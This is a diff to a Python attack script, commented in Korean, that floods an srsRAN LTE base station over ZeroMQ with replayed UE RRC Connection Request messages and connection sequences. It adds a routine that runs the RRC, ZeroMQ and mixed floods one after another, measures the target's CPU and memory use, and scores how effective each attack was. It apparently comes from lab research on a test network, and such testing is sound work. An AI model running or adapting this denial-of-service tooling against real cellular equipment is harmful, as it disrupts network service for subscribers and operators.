@@ -335,12 +335,288 @@ class RealUEAttack:
         
         self.log_message(f"공격 결과 저장: {results_file}")
     
+    def run_all_attacks(self, duration=60):
+        """모든 공격 유형을 순차적으로 실행하고 결과 비교"""
+        self.setup_logging("all_attacks", duration)
+        
+        # 전체 공격 결과 저장용
+        all_results = {
+            'total_start_stats': None,
+            'total_end_stats': None,
+            'attack_results': {},
+            'comparison': {}
+        }
+        
+        self.log_message("=" * 60)
+        self.log_message("=== 모든 공격 유형 순차 실행 시작 ===")
+        self.log_message(f"각 공격 지속 시간: {duration}초")
+        self.log_message("=" * 60)
+        
+        # 전체 시작 리소스 상태 캡처
+        self.log_message("전체 공격 시작 전 리소스 상태 캡처 중...")
+        all_results['total_start_stats'] = self.get_system_stats()
+        total_start_time = datetime.now()
+        
+        if all_results['total_start_stats']:
+            self.log_message(f"전체 시작 CPU: {all_results['total_start_stats']['cpu_percent']:.1f}%")
+            self.log_message(f"전체 시작 메모리: {all_results['total_start_stats']['memory_percent']:.1f}% ({all_results['total_start_stats']['memory_used_gb']:.2f}GB)")
+            self.log_message(f"전체 시작 네트워크 송신: {all_results['total_start_stats']['bytes_sent']:,} bytes")
+            self.log_message(f"전체 시작 네트워크 수신: {all_results['total_start_stats']['bytes_recv']:,} bytes")
+            self.log_message(f"전체 시작 srsRAN CPU: {all_results['total_start_stats']['srsran_cpu']:.1f}%")
+            self.log_message(f"전체 시작 srsRAN 메모리: {all_results['total_start_stats']['srsran_memory']:.1f}%")
+        
+        # 1. RRC Connection Request 공격
+        self.log_message("\n" + "=" * 60)
+        self.log_message("=== 1. RRC Connection Request 공격 시작 ===")
+        self.log_message("=" * 60)
+        
+        rrc_start_stats = self.get_system_stats()
+        rrc_start_time = datetime.now()
+        
+        self.running = True
+        start_time = time.time()
+        rrc_count = 0
+        
+        while self.running and (time.time() - start_time) < duration:
+            message = self.real_messages[2]  # RRC Connection Request
+            if self.send_real_message(message, f"RRC Connection Request #{rrc_count+1}"):
+                rrc_count += 1
+            time.sleep(0.1)
+        
+        rrc_end_stats = self.get_system_stats()
+        rrc_end_time = datetime.now()
+        
+        all_results['attack_results']['rrc'] = {
+            'start_stats': rrc_start_stats,
+            'end_stats': rrc_end_stats,
+            'start_time': rrc_start_time,
+            'end_time': rrc_end_time,
+            'message_count': rrc_count,
+            'duration': duration
+        }
+        
+        self.log_message(f"RRC 공격 완료: {rrc_count}개 메시지 전송")
+        self.log_message(f"RRC 공격 시간: {(rrc_end_time - rrc_start_time).total_seconds():.1f}초")
+        
+        # 공격 간 휴식
+        self.log_message("\n공격 간 휴식 (5초)...")
+        time.sleep(5)
+        
+        # 2. ZeroMQ 시퀀스 공격
+        self.log_message("\n" + "=" * 60)
+        self.log_message("=== 2. ZeroMQ 시퀀스 공격 시작 ===")
+        self.log_message("=" * 60)
+        
+        zmq_start_stats = self.get_system_stats()
+        zmq_start_time = datetime.now()
+        
+        self.running = True
+        start_time = time.time()
+        zmq_count = 0
+        
+        while self.running and (time.time() - start_time) < duration:
+            self.send_zeromq_sequence()
+            zmq_count += 1
+            time.sleep(0.5)
+        
+        zmq_end_stats = self.get_system_stats()
+        zmq_end_time = datetime.now()
+        
+        all_results['attack_results']['zeromq'] = {
+            'start_stats': zmq_start_stats,
+            'end_stats': zmq_end_stats,
+            'start_time': zmq_start_time,
+            'end_time': zmq_end_time,
+            'message_count': zmq_count,
+            'duration': duration
+        }
+        
+        self.log_message(f"ZeroMQ 공격 완료: {zmq_count}개 시퀀스 전송")
+        self.log_message(f"ZeroMQ 공격 시간: {(zmq_end_time - zmq_start_time).total_seconds():.1f}초")
+        
+        # 공격 간 휴식
+        self.log_message("\n공격 간 휴식 (5초)...")
+        time.sleep(5)
+        
+        # 3. 혼합 공격
+        self.log_message("\n" + "=" * 60)
+        self.log_message("=== 3. 혼합 공격 시작 ===")
+        self.log_message("=" * 60)
+        
+        mixed_start_stats = self.get_system_stats()
+        mixed_start_time = datetime.now()
+        
+        self.running = True
+        start_time = time.time()
+        mixed_count = 0
+        
+        while self.running and (time.time() - start_time) < duration:
+            if random.random() < 0.5:
+                message = self.real_messages[2]  # RRC Connection Request
+                self.send_real_message(message, f"RRC Connection Request #{mixed_count+1}")
+            else:
+                self.send_zeromq_sequence()
+            mixed_count += 1
+            time.sleep(0.1)
+        
+        mixed_end_stats = self.get_system_stats()
+        mixed_end_time = datetime.now()
+        
+        all_results['attack_results']['mixed'] = {
+            'start_stats': mixed_start_stats,
+            'end_stats': mixed_end_stats,
+            'start_time': mixed_start_time,
+            'end_time': mixed_end_time,
+            'message_count': mixed_count,
+            'duration': duration
+        }
+        
+        self.log_message(f"혼합 공격 완료: {mixed_count}개 메시지/시퀀스 전송")
+        self.log_message(f"혼합 공격 시간: {(mixed_end_time - mixed_start_time).total_seconds():.1f}초")
+        
+        # 전체 종료 리소스 상태 캡처
+        self.log_message("\n" + "=" * 60)
+        self.log_message("전체 공격 종료 후 리소스 상태 캡처 중...")
+        all_results['total_end_stats'] = self.get_system_stats()
+        total_end_time = datetime.now()
+        
+        if all_results['total_end_stats']:
+            self.log_message(f"전체 종료 CPU: {all_results['total_end_stats']['cpu_percent']:.1f}%")
+            self.log_message(f"전체 종료 메모리: {all_results['total_end_stats']['memory_percent']:.1f}% ({all_results['total_end_stats']['memory_used_gb']:.2f}GB)")
+            self.log_message(f"전체 종료 네트워크 송신: {all_results['total_end_stats']['bytes_sent']:,} bytes")
+            self.log_message(f"전체 종료 네트워크 수신: {all_results['total_end_stats']['bytes_recv']:,} bytes")
+            self.log_message(f"전체 종료 srsRAN CPU: {all_results['total_end_stats']['srsran_cpu']:.1f}%")
+            self.log_message(f"전체 종료 srsRAN 메모리: {all_results['total_end_stats']['srsran_memory']:.1f}%")
+        
+        # 모든 공격 결과 비교 분석
+        self.log_message("\n" + "=" * 60)
+        self.log_message("=== 모든 공격 결과 비교 분석 ===")
+        self.log_message("=" * 60)
+        
+        self.analyze_all_attack_results(all_results)
+        
+        # 전체 결과를 JSON 파일로 저장
+        self.save_all_attack_results(all_results, total_start_time, total_end_time)
+        
+        self.log_message("\n" + "=" * 60)
+        self.log_message("=== 모든 공격 완료 ===")
+        self.log_message(f"총 공격 시간: {(total_end_time - total_start_time).total_seconds():.1f}초")
+        self.log_message(f"RRC 메시지: {rrc_count}개")
+        self.log_message(f"ZeroMQ 시퀀스: {zmq_count}개")
+        self.log_message(f"혼합 메시지: {mixed_count}개")
+        self.log_message("=" * 60)
+    
+    def analyze_all_attack_results(self, all_results):
+        """모든 공격 결과 비교 분석"""
+        attack_names = {
+            'rrc': 'RRC Connection Request',
+            'zeromq': 'ZeroMQ 시퀀스',
+            'mixed': '혼합 공격'
+        }
+        
+        # 각 공격별 효과 분석
+        for attack_type, attack_name in attack_names.items():
+            if attack_type in all_results['attack_results']:
+                result = all_results['attack_results'][attack_type]
+                start_stats = result['start_stats']
+                end_stats = result['end_stats']
+                
+                if start_stats and end_stats:
+                    self.log_message(f"\n--- {attack_name} 공격 효과 ---")
+                    
+                    cpu_change = end_stats['cpu_percent'] - start_stats['cpu_percent']
+                    memory_change = end_stats['memory_percent'] - start_stats['memory_percent']
+                    srsran_cpu_change = end_stats['srsran_cpu'] - start_stats['srsran_cpu']
+                    srsran_memory_change = end_stats['srsran_memory'] - start_stats['srsran_memory']
+                    
+                    self.log_message(f"CPU 변화: {cpu_change:+.1f}%")
+                    self.log_message(f"메모리 변화: {memory_change:+.1f}%")
+                    self.log_message(f"srsRAN CPU 변화: {srsran_cpu_change:+.1f}%")
+                    self.log_message(f"srsRAN 메모리 변화: {srsran_memory_change:+.1f}%")
+                    
+                    # 효과 평가
+                    effectiveness = 0
+                    if abs(cpu_change) > 5:
+                        effectiveness += 1
+                        self.log_message(f"✓ CPU 효과: {'증가' if cpu_change > 0 else '감소'} ({cpu_change:+.1f}%)")
+                    if abs(memory_change) > 2:
+                        effectiveness += 1
+                        self.log_message(f"✓ 메모리 효과: {'증가' if memory_change > 0 else '감소'} ({memory_change:+.1f}%)")
+                    if abs(srsran_cpu_change) > 5:
+                        effectiveness += 1
+                        self.log_message(f"✓ srsRAN CPU 효과: {'증가' if srsran_cpu_change > 0 else '감소'} ({srsran_cpu_change:+.1f}%)")
+                    if abs(srsran_memory_change) > 2:
+                        effectiveness += 1
+                        self.log_message(f"✓ srsRAN 메모리 효과: {'증가' if srsran_memory_change > 0 else '감소'} ({srsran_memory_change:+.1f}%)")
+                    
+                    if effectiveness == 0:
+                        self.log_message("✗ 공격 효과가 미미합니다")
+                    elif effectiveness <= 2:
+                        self.log_message(f"△ 공격 효과가 보통입니다 ({effectiveness}/4)")
+                    else:
+                        self.log_message(f"✓ 공격 효과가 큽니다 ({effectiveness}/4)")
+        
+        # 전체 효과 비교
+        self.log_message(f"\n--- 전체 공격 효과 비교 ---")
+        if all_results['total_start_stats'] and all_results['total_end_stats']:
+            total_cpu_change = all_results['total_end_stats']['cpu_percent'] - all_results['total_start_stats']['cpu_percent']
+            total_memory_change = all_results['total_end_stats']['memory_percent'] - all_results['total_start_stats']['memory_percent']
+            total_srsran_cpu_change = all_results['total_end_stats']['srsran_cpu'] - all_results['total_start_stats']['srsran_cpu']
+            total_srsran_memory_change = all_results['total_end_stats']['srsran_memory'] - all_results['total_start_stats']['srsran_memory']
+            
+            self.log_message(f"전체 CPU 변화: {total_cpu_change:+.1f}%")
+            self.log_message(f"전체 메모리 변화: {total_memory_change:+.1f}%")
+            self.log_message(f"전체 srsRAN CPU 변화: {total_srsran_cpu_change:+.1f}%")
+            self.log_message(f"전체 srsRAN 메모리 변화: {total_srsran_memory_change:+.1f}%")
+    
+    def save_all_attack_results(self, all_results, total_start_time, total_end_time):
+        """모든 공격 결과를 JSON 파일로 저장"""
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        results_file = f"{self.log_dir}/all_attacks_results_{timestamp}.json"
+        
+        results = {
+            'attack_info': {
+                'type': 'all_attacks',
+                'total_duration': (total_end_time - total_start_time).total_seconds(),
+                'start_time': total_start_time.isoformat(),
+                'end_time': total_end_time.isoformat(),
+                'target_port': self.target_port
+            },
+            'total_start_stats': all_results['total_start_stats'],
+            'total_end_stats': all_results['total_end_stats'],
+            'attack_results': all_results['attack_results'],
+            'real_messages_used': [
+                msg.hex() for msg in self.real_messages
+            ]
+        }
+        
+        with open(results_file, 'w', encoding='utf-8') as f:
+            json.dump(results, f, indent=2, ensure_ascii=False)
+        
+        self.log_message(f"전체 공격 결과 저장: {results_file}")
+    
     def zeromq_sequence_flood(self, duration=60):
         """ZeroMQ 연결 시퀀스 플러딩"""
-        print(f"=== ZeroMQ 연결 시퀀스 플러딩 ===")
-        print(f"대상 포트: {self.target_port}")
-        print(f"지속 시간: {duration}초")
-        print("=" * 50)
+        self.setup_logging("zeromq_sequence", duration)
+        
+        # 공격 시작 전 리소스 상태 캡처
+        self.log_message("공격 시작 전 리소스 상태 캡처 중...")
+        self.start_stats = self.get_system_stats()
+        self.start_time = datetime.now()
+        
+        if self.start_stats:
+            self.log_message(f"시작 CPU: {self.start_stats['cpu_percent']:.1f}%")
+            self.log_message(f"시작 메모리: {self.start_stats['memory_percent']:.1f}% ({self.start_stats['memory_used_gb']:.2f}GB)")
+            self.log_message(f"시작 네트워크 송신: {self.start_stats['bytes_sent']:,} bytes")
+            self.log_message(f"시작 네트워크 수신: {self.start_stats['bytes_recv']:,} bytes")
+            self.log_message(f"시작 srsRAN CPU: {self.start_stats['srsran_cpu']:.1f}%")
+            self.log_message(f"시작 srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
+        
+        self.log_message("=" * 50)
+        self.log_message(f"=== ZeroMQ 연결 시퀀스 플러딩 시작 ===")
+        self.log_message(f"대상 포트: {self.target_port}")
+        self.log_message(f"지속 시간: {duration}초")
+        self.log_message("=" * 50)
         
         self.running = True
         start_time = time.time()
@@ -351,15 +627,94 @@ class RealUEAttack:
             count += 1
             time.sleep(0.5)  # 500ms 간격
         
-        print(f"\n=== 플러딩 완료 ===")
-        print(f"총 {count}개 시퀀스 전송")
+        # 공격 종료 후 리소스 상태 캡처
+        self.log_message("=" * 50)
+        self.log_message("공격 종료 후 리소스 상태 캡처 중...")
+        self.end_stats = self.get_system_stats()
+        self.end_time = datetime.now()
+        
+        if self.end_stats:
+            self.log_message(f"종료 CPU: {self.end_stats['cpu_percent']:.1f}%")
+            self.log_message(f"종료 메모리: {self.end_stats['memory_percent']:.1f}% ({self.end_stats['memory_used_gb']:.2f}GB)")
+            self.log_message(f"종료 네트워크 송신: {self.end_stats['bytes_sent']:,} bytes")
+            self.log_message(f"종료 네트워크 수신: {self.end_stats['bytes_recv']:,} bytes")
+            self.log_message(f"종료 srsRAN CPU: {self.end_stats['srsran_cpu']:.1f}%")
+            self.log_message(f"종료 srsRAN 메모리: {self.end_stats['srsran_memory']:.1f}%")
+        
+        # 리소스 변화량 계산 및 출력
+        if self.start_stats and self.end_stats:
+            self.log_message("=" * 50)
+            self.log_message("=== 리소스 변화량 분석 ===")
+            
+            cpu_change = self.end_stats['cpu_percent'] - self.start_stats['cpu_percent']
+            memory_change = self.end_stats['memory_percent'] - self.start_stats['memory_percent']
+            memory_gb_change = self.end_stats['memory_used_gb'] - self.start_stats['memory_used_gb']
+            bytes_sent_change = self.end_stats['bytes_sent'] - self.start_stats['bytes_sent']
+            bytes_recv_change = self.end_stats['bytes_recv'] - self.start_stats['bytes_recv']
+            srsran_cpu_change = self.end_stats['srsran_cpu'] - self.start_stats['srsran_cpu']
+            srsran_memory_change = self.end_stats['srsran_memory'] - self.start_stats['srsran_memory']
+            
+            self.log_message(f"CPU 변화: {cpu_change:+.1f}%")
+            self.log_message(f"메모리 변화: {memory_change:+.1f}% ({memory_gb_change:+.2f}GB)")
+            self.log_message(f"네트워크 송신 변화: {bytes_sent_change:+,} bytes")
+            self.log_message(f"네트워크 수신 변화: {bytes_recv_change:+,} bytes")
+            self.log_message(f"srsRAN CPU 변화: {srsran_cpu_change:+.1f}%")
+            self.log_message(f"srsRAN 메모리 변화: {srsran_memory_change:+.1f}%")
+            
+            # 공격 효과 분석
+            self.log_message("=" * 50)
+            self.log_message("=== 공격 효과 분석 ===")
+            if abs(cpu_change) > 5:
+                self.log_message(f"✓ CPU 사용량이 {'증가' if cpu_change > 0 else '감소'}했습니다 ({cpu_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ CPU 사용량 변화가 미미합니다 ({cpu_change:+.1f}%)")
+            
+            if abs(memory_change) > 2:
+                self.log_message(f"✓ 메모리 사용량이 {'증가' if memory_change > 0 else '감소'}했습니다 ({memory_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ 메모리 사용량 변화가 미미합니다 ({memory_change:+.1f}%)")
+            
+            if abs(srsran_cpu_change) > 5:
+                self.log_message(f"✓ srsRAN CPU 사용량이 {'증가' if srsran_cpu_change > 0 else '감소'}했습니다 ({srsran_cpu_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ srsRAN CPU 사용량 변화가 미미합니다 ({srsran_cpu_change:+.1f}%)")
+            
+            if abs(srsran_memory_change) > 2:
+                self.log_message(f"✓ srsRAN 메모리 사용량이 {'증가' if srsran_memory_change > 0 else '감소'}했습니다 ({srsran_memory_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ srsRAN 메모리 사용량 변화가 미미합니다 ({srsran_memory_change:+.1f}%)")
+        
+        # 결과를 JSON 파일로 저장
+        self.save_attack_results(count, duration)
+        
+        self.log_message("=" * 50)
+        self.log_message(f"=== 플러딩 완료 ===")
+        self.log_message(f"총 {count}개 시퀀스 전송")
+        self.log_message(f"공격 시간: {(self.end_time - self.start_time).total_seconds():.1f}초")
+        self.log_message("=" * 50)
     
     def mixed_flood(self, duration=60):
         """혼합 플러딩 (RRC + ZeroMQ 시퀀스)"""
-        print(f"=== 혼합 플러딩 (RRC + ZeroMQ) ===")
-        print(f"대상 포트: {self.target_port}")
-        print(f"지속 시간: {duration}초")
-        print("=" * 50)
+        self.setup_logging("mixed", duration)
+        
+        # 공격 시작 전 리소스 상태 캡처
+        self.log_message("공격 시작 전 리소스 상태 캡처 중...")
+        self.start_stats = self.get_system_stats()
+        self.start_time = datetime.now()
+        
+        if self.start_stats:
+            self.log_message(f"시작 CPU: {self.start_stats['cpu_percent']:.1f}%")
+            self.log_message(f"시작 메모리: {self.start_stats['memory_percent']:.1f}% ({self.start_stats['memory_used_gb']:.2f}GB)")
+            self.log_message(f"시작 네트워크 송신: {self.start_stats['bytes_sent']:,} bytes")
+            self.log_message(f"시작 네트워크 수신: {self.start_stats['bytes_recv']:,} bytes")
+            self.log_message(f"시작 srsRAN CPU: {self.start_stats['srsran_cpu']:.1f}%")
+            self.log_message(f"시작 srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
+        
+        self.log_message("=" * 50)
+        self.log_message(f"=== 혼합 플러딩 (RRC + ZeroMQ) 시작 ===")
+        self.log_message(f"대상 포트: {self.target_port}")
+        self.log_message(f"지속 시간: {duration}초")
+        self.log_message("=" * 50)
         
         self.running = True
         start_time = time.time()
@@ -376,8 +731,71 @@ class RealUEAttack:
             count += 1
             time.sleep(0.1)  # 100ms 간격
         
-        print(f"\n=== 플러딩 완료 ===")
-        print(f"총 {count}개 메시지/시퀀스 전송")
+        # 공격 종료 후 리소스 상태 캡처
+        self.log_message("=" * 50)
+        self.log_message("공격 종료 후 리소스 상태 캡처 중...")
+        self.end_stats = self.get_system_stats()
+        self.end_time = datetime.now()
+        
+        if self.end_stats:
+            self.log_message(f"종료 CPU: {self.end_stats['cpu_percent']:.1f}%")
+            self.log_message(f"종료 메모리: {self.end_stats['memory_percent']:.1f}% ({self.end_stats['memory_used_gb']:.2f}GB)")
+            self.log_message(f"종료 네트워크 송신: {self.end_stats['bytes_sent']:,} bytes")
+            self.log_message(f"종료 네트워크 수신: {self.end_stats['bytes_recv']:,} bytes")
+            self.log_message(f"종료 srsRAN CPU: {self.end_stats['srsran_cpu']:.1f}%")
+            self.log_message(f"종료 srsRAN 메모리: {self.end_stats['srsran_memory']:.1f}%")
+        
+        # 리소스 변화량 계산 및 출력
+        if self.start_stats and self.end_stats:
+            self.log_message("=" * 50)
+            self.log_message("=== 리소스 변화량 분석 ===")
+            
+            cpu_change = self.end_stats['cpu_percent'] - self.start_stats['cpu_percent']
+            memory_change = self.end_stats['memory_percent'] - self.start_stats['memory_percent']
+            memory_gb_change = self.end_stats['memory_used_gb'] - self.start_stats['memory_used_gb']
+            bytes_sent_change = self.end_stats['bytes_sent'] - self.start_stats['bytes_sent']
+            bytes_recv_change = self.end_stats['bytes_recv'] - self.start_stats['bytes_recv']
+            srsran_cpu_change = self.end_stats['srsran_cpu'] - self.start_stats['srsran_cpu']
+            srsran_memory_change = self.end_stats['srsran_memory'] - self.start_stats['srsran_memory']
+            
+            self.log_message(f"CPU 변화: {cpu_change:+.1f}%")
+            self.log_message(f"메모리 변화: {memory_change:+.1f}% ({memory_gb_change:+.2f}GB)")
+            self.log_message(f"네트워크 송신 변화: {bytes_sent_change:+,} bytes")
+            self.log_message(f"네트워크 수신 변화: {bytes_recv_change:+,} bytes")
+            self.log_message(f"srsRAN CPU 변화: {srsran_cpu_change:+.1f}%")
+            self.log_message(f"srsRAN 메모리 변화: {srsran_memory_change:+.1f}%")
+            
+            # 공격 효과 분석
+            self.log_message("=" * 50)
+            self.log_message("=== 공격 효과 분석 ===")
+            if abs(cpu_change) > 5:
+                self.log_message(f"✓ CPU 사용량이 {'증가' if cpu_change > 0 else '감소'}했습니다 ({cpu_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ CPU 사용량 변화가 미미합니다 ({cpu_change:+.1f}%)")
+            
+            if abs(memory_change) > 2:
+                self.log_message(f"✓ 메모리 사용량이 {'증가' if memory_change > 0 else '감소'}했습니다 ({memory_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ 메모리 사용량 변화가 미미합니다 ({memory_change:+.1f}%)")
+            
+            if abs(srsran_cpu_change) > 5:
+                self.log_message(f"✓ srsRAN CPU 사용량이 {'증가' if srsran_cpu_change > 0 else '감소'}했습니다 ({srsran_cpu_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ srsRAN CPU 사용량 변화가 미미합니다 ({srsran_cpu_change:+.1f}%)")
+            
+            if abs(srsran_memory_change) > 2:
+                self.log_message(f"✓ srsRAN 메모리 사용량이 {'증가' if srsran_memory_change > 0 else '감소'}했습니다 ({srsran_memory_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ srsRAN 메모리 사용량 변화가 미미합니다 ({srsran_memory_change:+.1f}%)")
+        
+        # 결과를 JSON 파일로 저장
+        self.save_attack_results(count, duration)
+        
+        self.log_message("=" * 50)
+        self.log_message(f"=== 플러딩 완료 ===")
+        self.log_message(f"총 {count}개 메시지/시퀀스 전송")
+        self.log_message(f"공격 시간: {(self.end_time - self.start_time).total_seconds():.1f}초")
+        self.log_message("=" * 50)
 
 def main():
     import argparse
@@ -385,7 +803,7 @@ def main():
     parser = argparse.ArgumentParser(description='실제 UE 메시지를 사용한 공격')
     parser.add_argument('--target-port', type=int, default=2001, help='eNB 포트 (기본값: 2001)')
     parser.add_argument('--duration', type=int, default=60, help='공격 지속 시간 (초)')
-    parser.add_argument('--attack-type', choices=['rrc', 'zeromq', 'mixed'], 
+    parser.add_argument('--attack-type', choices=['rrc', 'zeromq', 'mixed', 'all'], 
                        default='mixed', help='공격 유형')
     
     args = parser.parse_args()
@@ -397,6 +815,8 @@ def main():
             attacker.rrc_connection_flood(args.duration)
         elif args.attack_type == 'zeromq':
             attacker.zeromq_sequence_flood(args.duration)
+        elif args.attack_type == 'all':
+            attacker.run_all_attacks(args.duration)
         else:
             attacker.mixed_flood(args.duration)
     except KeyboardInterrupt:
